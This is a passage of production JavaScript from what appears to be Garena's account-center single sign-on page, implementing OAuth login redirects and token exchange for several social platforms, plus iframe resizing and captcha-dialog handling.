	}

	function loginLine() {
		var params = {};
		params.response_type = 'code';
		params.client_id = SETTINGS.line_client_id;
		params.redirect_uri = updateURLParameter(window.location.href.split('#')[0], 'platform', PLATFORM_LINE, true);
		params.state = SETTINGS.line_state;
		params.scope = 'profile openid';

		redirect(LINE_OAUTH_URL, params);
	}

	function loginGoogle() {
		var client_id = SETTINGS.google_client_id;
		var redirectUrl = window.location.href.split('?')[0] + '/google'
		var params = getRequestParams()
		params.platform = PLATFORM_GOOGLE
		var sParams = '';
		for (var key in params) {
			if (key == 'redirect_uri') params[key] = encodeURIComponent(params[key]);
			sParams += '&' + key + '=' + params[key];
		}
		var form = document.createElement('form');
		form.setAttribute('method', 'GET');
		form.setAttribute('action', GOOGLE_OAUTH_URL);
		var state = encodeURIComponent(sParams);
		var params = {
			'client_id': client_id,
			'redirect_uri': redirectUrl,
			'response_type': 'code',
			'scope': 'profile email openid',
			'state': state
		};

		for (var p in params) {
			var input = document.createElement('input');
			input.setAttribute('type', 'hidden');
			input.setAttribute('name', p);
			input.setAttribute('value', params[p]);
			form.appendChild(input);
		}

		document.body.appendChild(form);
		form.submit();
	};

	function loginHuawei() {
		var params = {};
		params.client_id = SETTINGS.huawei_app_id;
		params.redirect_uri = updateURLParameter(window.location.href.split('#')[0], 'platform', PLATFORM_HUAWEI, true);
		params.response_type = 'code';
		params.scope = 'https://www.huawei.com/auth/account/base.profile';
		redirect(HUAWEI_OAUTH_URL, params);
	}

	function loginApple() {
		var params = {};
		params.client_id = SETTINGS.apple_client_id;
		params.scope = 'name email';
		params.redirect_uri = window.location.href.split('?')[0] + '/apple';
		params.response_type = 'code id_token';
		params.response_mode = 'form_post';

		var requestParams = getRequestParams();
		requestParams.platform = PLATFORM_APPLE;
		var sParams = '';
		for (var key in requestParams) {
			if (key == 'redirect_uri') requestParams[key] = encodeURIComponent(requestParams[key]);
			sParams += '&' + key + '=' + requestParams[key];
		}
		params.state = SETTINGS.apple_state + '-' + encodeURIComponent(sParams);

		redirect(APPLE_OAUTH_URL, params);
	}

	function loginTwitter() {
		var params = {};
		var requestParams = getRequestParams();
		requestParams['platform'] = PLATFORM_TWITTER;
		var sParams = '';
		for(var key in requestParams) {
			if (key == 'redirect_uri') requestParams[key] = encodeURIComponent(requestParams[key]);
			sParams += '&' + key + '=' + requestParams[key];
		}
		params.callback_uri = window.location.href.split('?')[0] + "?" + encodeURIComponent(sParams.substr(1));

		requestJson(SSO_URL_OAUTH_TWITTER_REQUEST_TOKEN, params, function (data) {
			params = {};
			if ('error' in data) {
				params.error = data.error;
			} else if ('twitter_request_token' in data) {
				// redirect to twitter
				params.oauth_token = data.twitter_request_token;
				redirect(TWITTER_OAUTH_URL, params);
				return;
			} else {
				params.error = 'error_unknown';
				redirect(getRequestParam('redirect_uri'), params);
			}

		}, 'post');
	}

	function loginFacebook() {
		var redirectUrl = window.location.href.split('?')[0] + '/facebook'
		var params = getRequestParams()
		params.platform = PLATFORM_FACEBOOK
		var sParams = '';
		for (var key in params) {
			if (key == 'redirect_uri') params[key] = encodeURIComponent(params[key]);
			sParams += '&' + key + '=' + params[key];
		}
		var state = encodeURIComponent(sParams.substr(1));

		var params = {
			client_id: SETTINGS.fb_app_id.toString(),
			redirect_uri: redirectUrl,
			response_type: 'token',
			scope: SETTINGS.fb_scope,
			state: state
		};
		redirect(FACEBOOK_OAUTH_URL, params);
	}

	/* =========================================
		Token Exchange
	   ========================================= */

	function extractParamsFromExchangeResult(data) {
		params = {};
		if ('error' in data) {
			params.error = data.error;
		} else if ('access_token' in data) {
			params.access_token = data.access_token;
		} else if ('code' in data) {
			params.code = data.code;
		} else {
			params.error = 'error_unknown';
		}
		return params;
	}

	function exchangeVkToken(access_token) {
		var redirect_uri = getRequestParam('redirect_uri');
		requestJson(SSO_URL_OAUTH_TOKEN_VK_EXCHANGE, {
			response_type: SETTINGS.response_type,
			vk_access_token: access_token,
			client_id: SETTINGS['app_id'],
			redirect_uri: redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			var state = getRequestParam('state')
			if (state !== null) {
				params.state = state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function exchangeLineToken(token) {
		var redirect_uri = getRequestParam('redirect_uri');
		var line_redirect_uri = updateURLParameter(window.location.href.split('#')[0], 'code', '')
		line_redirect_uri = removeLastParamByName(line_redirect_uri, 'state')
		var requestParams = getUrlParams(line_redirect_uri);
		requestJson(SSO_URL_OAUTH_TOKEN_LINE_EXCHANGE, {
			response_type: SETTINGS.response_type,
			line_auth_code: token,
			client_id: SETTINGS['app_id'],
			redirect_uri: redirect_uri,
			line_redirect_uri: line_redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			if ('state' in requestParams) {
				params.state = requestParams.state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function exchangeGoogleToken(google_auth_code) {
		var redirect_uri = getRequestParam('redirect_uri');
		requestJson(SSO_URL_OAUTH_TOKEN_GOOGLE_EXCHANGE, {
			response_type: SETTINGS.response_type,
			google_auth_code: google_auth_code,
			client_id: SETTINGS['app_id'],
			google_redirect_uri: window.location.href.split('?')[0] + '/google',
			redirect_uri: redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			var state = getRequestParam('state')
			if (state !== null) {
				params.state = state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function exchangeHuaweiToken(auth_code) {
		var redirect_uri = getRequestParam('redirect_uri');
		requestJson(SSO_URL_OAUTH_TOKEN_HUAWEI_EXCHANGE, {
			response_type: SETTINGS.response_type,
			hw_auth_code: auth_code,
			client_id: SETTINGS['app_id'],
			huawei_redirect_uri: updateURLParameter(window.location.href.split('#')[0], 'authorization_code', ''),
			redirect_uri: redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			var state = getRequestParam('state')
			if (state !== null) {
				params.state = state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function exchangeAppleToken(apple_auth_code) {
		var redirect_uri = getRequestParam('redirect_uri');
		requestJson(SSO_URL_OAUTH_TOKEN_APPLE_EXCHANGE_WEB, {
			response_type: SETTINGS.response_type,
			apple_auth_code: apple_auth_code,
			client_id: SETTINGS['app_id'],
			redirect_uri: redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			var state = getRequestParam('state')
			if (state !== null) {
				params.state = state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function exchangeTwitterToken(twitter_oauth_token, oauth_verifier) {
		var redirect_uri = getRequestParam('redirect_uri');
		requestJson(SSO_URL_OAUTH_TOKEN_TWITTER_EXCHANGE, {
			response_type: SETTINGS.response_type,
			twitter_oauth_token: twitter_oauth_token,
			oauth_verifier: oauth_verifier,
			client_id: SETTINGS['app_id'],
			redirect_uri: redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			var state = getRequestParam('state')
			if (state !== null) {
				params.state = state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function exchangeFacebookToken(access_token) {
		var redirect_uri = getRequestParam('redirect_uri');
		requestJson(SSO_URL_OAUTH_TOKEN_FACEBOOK_EXCHANGE, {
			response_type: SETTINGS.response_type,
			facebook_access_token: access_token,
			client_id: SETTINGS['app_id'],
			redirect_uri: redirect_uri
		}, function (data) {
			params = extractParamsFromExchangeResult(data);
			var state = getRequestParam('state')
			if (state !== null) {
				params.state = state;
			}
			redirect(redirect_uri, params);
		}, 'post');
	}

	function checkLoginVk() {
		var accessToken = getRequestFragment("access_token"),
			userId = getRequestFragment("user_id");
		if (accessToken && userId) {
			exchangeVkToken(accessToken);
			return true;
		}
		return false;
	}

	function checkLoginLine() {
		var code = getRequestParam("code"),
			error = getRequestParam("error"),
			error_reason;

		if (code != null) {
			exchangeLineToken(code)
			return true;
		} else if (error != null && SETTINGS.platform == PLATFORM_LINE) {
			error_reason = 'error_' + getRequestParam("error_reason");
			redirect(getRequestParam('redirect_uri'), { error: error_reason });
			return true;
		}
		return false;
	}

	function checkLoginGoogle() {
		var google_auth_code = getRequestParam("google_auth_code");
		if (google_auth_code) {
			exchangeGoogleToken(google_auth_code);
			return true;
		}
		return false;
	}

	function checkLoginHuawei() {
		var authorization_code = getRequestParam("authorization_code");
		if (authorization_code) {
			exchangeHuaweiToken(authorization_code);
			return true;
		}
		return false;
	}

	function checkLoginApple() {
		var apple_auth_code = getRequestParam("apple_auth_code");
		if (apple_auth_code) {
			exchangeAppleToken(apple_auth_code);
			return true;
		}
		return false;
	}

	function checkLoginTwitter() {
		var oauth_token = getRequestParam("oauth_token");
		var oauth_verifier = getRequestParam("oauth_verifier");
		if (oauth_token && oauth_verifier) {
			exchangeTwitterToken(oauth_token, oauth_verifier);
			return true;
		}
		return false;
	}

	function checkLoginFacebook() {
		var accessToken = getRequestFragment("access_token"),
			error = getRequestParam("error"),
			error_reason;
		if (accessToken != null) {
			exchangeFacebookToken(accessToken);
			return true;
		}
		if (error != null && SETTINGS.platform == PLATFORM_FACEBOOK) {
			error_reason = 'error_' + getRequestParam("error_reason");
			redirect(getRequestParam('redirect_uri'), { error: error_reason });
			return true;
		}
		return false;
	}

	function iframeTryPostAfterLogin(data) {
		if (SETTINGS.iframe) {
			parent.postMessage(JSON.stringify(data), SETTINGS.target_origin);
			return true;
		}
		return false;
	}

	function iframeDetectHeight() {
		onElementHeightChange(document.body, function (height) {
			var data = { height: height };
			parent.postMessage(JSON.stringify(data), SETTINGS.target_origin);
		})
	}

	function onElementHeightChange(elm, callback) {
		var lastHeight = elm.clientHeight, newHeight;
		callback(lastHeight);
		(function run() {
			newHeight = elm.clientHeight;
			if (lastHeight != newHeight)
				callback(newHeight);
			lastHeight = newHeight;

			if (elm.onElementHeightChangeTimer)
				clearTimeout(elm.onElementHeightChangeTimer);

			elm.onElementHeightChangeTimer = setTimeout(run, 100);
		})();
	}

	function init(settings) {
		SETTINGS = settings;
		if (SETTINGS.mode == 'sso_login' || SETTINGS.mode == 'oauth_login') {
			if (SETTINGS.platform == PLATFORM_LINE && checkLoginLine()) {
				return;
			}
			if (checkLoginVk()) {
				return;
			}
			if (SETTINGS.platform == PLATFORM_GOOGLE && checkLoginGoogle()) {
				return;
			}
			if (SETTINGS.platform == PLATFORM_HUAWEI && checkLoginHuawei()) {
				return;
			}
			if (SETTINGS.platform == PLATFORM_APPLE && checkLoginApple()) {
				return;
			}
			if (SETTINGS.platform == PLATFORM_TWITTER && checkLoginTwitter()) {
				return;
			}
			if (checkLoginFacebook()) {
				return;
			}

			switch(SETTINGS.platform) {
				case PLATFORM_VK:
					loginVk();
					break;
				case PLATFORM_LINE:
					loginLine();
					break;
				case PLATFORM_GOOGLE:
					loginGoogle();
					break;
				case PLATFORM_HUAWEI:
					loginHuawei();
					break;
				case PLATFORM_FACEBOOK:
					loginFacebook();
					break;
				case PLATFORM_APPLE:
					loginApple();
					break;
				case PLATFORM_TWITTER:
					loginTwitter();
					break;
				default:
					showLoginPage(isMobile() ? 'mobile' : 'pc');
			}
		} else if (SETTINGS.mode == 'oauth_grant') {
			showGrantPage(isMobile() ? 'mobile' : 'pc');
		} else if (SETTINGS.mode == 'register') {
			showRegisterPage(isMobile() ? 'mobile' : 'pc');
		}
		SSO_SERVER.initCallback();
	}

	function setInitCallback(func) {
		SSO_SERVER.initCallback = func;
	}

	window.SSO_SERVER = {};
	var SSO_SERVER = window.SSO_SERVER;
	SSO_SERVER.init = init;
	SSO_SERVER.preloginCallback = preloginCallback;
	SSO_SERVER.loginCallback = loginCallback;
	SSO_SERVER.grantTokenCallback = grantTokenCallback;
	SSO_SERVER.initCallback = function () { };
})();
</script>
<script type="text/javascript">
$(function() {
	window.SSO_SERVER.init({
		'test': false,
		'static_root': '/',
		'language': 'vi',
		'country': 'VN',
		'mode': 'sso_login',
		
		
		'app_id': 10100,
		'app_name': 'Garena Account Center',
		'app_icon': '',
		
		
		'login': false,
		
		
		
		'session_cookie_name': 'sso_key',
		'session_cookie_domain': 'garena.com',
		
		
		'platform': 1,
		'response_type': '',
		'state': '',
		'show_platforms': 0,
		'line_client_id': '',
		'line_state': '',
		'vk_client_id': 0,
		'google_client_id': '',
		'huawei_app_id': '',
		'apple_client_id': '',
		'apple_state': '',
		'fb_app_id': 0,
		'fb_scope': '',
		
		
		'gas_download': true,
		'recaptcha_site_key': '6Le9UCgdAAAAAPJFqbDiy-eayQzVkpX6lJYPlyqp',
		
		
		
		'':''
	});

	/* resize cross-origin iframe */
	// browser compatibility: get method for event
	// addEventListener(FF, Webkit, Opera, IE9+) and attachEvent(IE5-8)
	var myEventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
	// create event listener
	var myEventListener = window[myEventMethod];
	// browser compatibility: attach event uses onmessage
	var myEventMessage = myEventMethod == "attachEvent" ? "onmessage" : "message";
	
	myEventListener('dd_blocked', myCallback);
	
	function myCallback(event) {
		var dd_dialog = null;

		var element = document.getElementById('recaptcha_wrapper_register_captcha_dialog');

		if (element) {
			dd_dialog = $('#sso_captcha_dialog_container_register_captcha_dialog');
			ga_dialog = $('#gacaptcha_wrapper_register_captcha_dialog');
		} else {
			element = document.getElementById('recaptcha_wrapper_login_captcha_dialog');
			if (element) {
				dd_dialog = $('#sso_captcha_dialog_container_login_captcha_dialog');
				ga_dialog = $('#gacaptcha_wrapper_login_captcha_dialog');
			}
		}

		if (dd_dialog) {
			displayDataDomeCaptchaPage(event.detail.captchaUrl, element);
			showDataDomeDialog(dd_dialog);
			dd_dialog.show();
			ga_dialog.hide();
			centralizeCaptchaDialog(dd_dialog);
		}
	}
	// register callback function on incoming message
	myEventListener(myEventMessage, function (e) {
		if (e.data == "dd_captcha_passed") {
			if ($('#sso_captcha_dialog_container_register_captcha_dialog')){
				// close register captcha dialog
				$('#sso_captcha_dialog_container_register_captcha_dialog').hide();
			}
			if ($('#sso_captcha_dialog_container_login_captcha_dialog')){
				// close login captcha dialog
				$('#sso_captcha_dialog_container_login_captcha_dialog').hide();
			}
			if ($('#confirm-btn')) {
				// reset login button style
				$('#confirm-btn').attr("disabled", false); 
			}
			return;
		}
		// verify the event origin, now only support ccms
		if (e.origin != 'https://contentgarena-a.akamaihd.net') {
			return;
		}
		// we will get a string (better browser support) and validate
		// if it is an int - set the height of the iframe #my-iframe-id
		if (e.data === parseInt(e.data)) {
			var iframe = document.getElementsByClassName('sso_dialog_frame')[0];
			$(iframe).height(e.data + "px");
		}
		
	}, false);

});
</script>
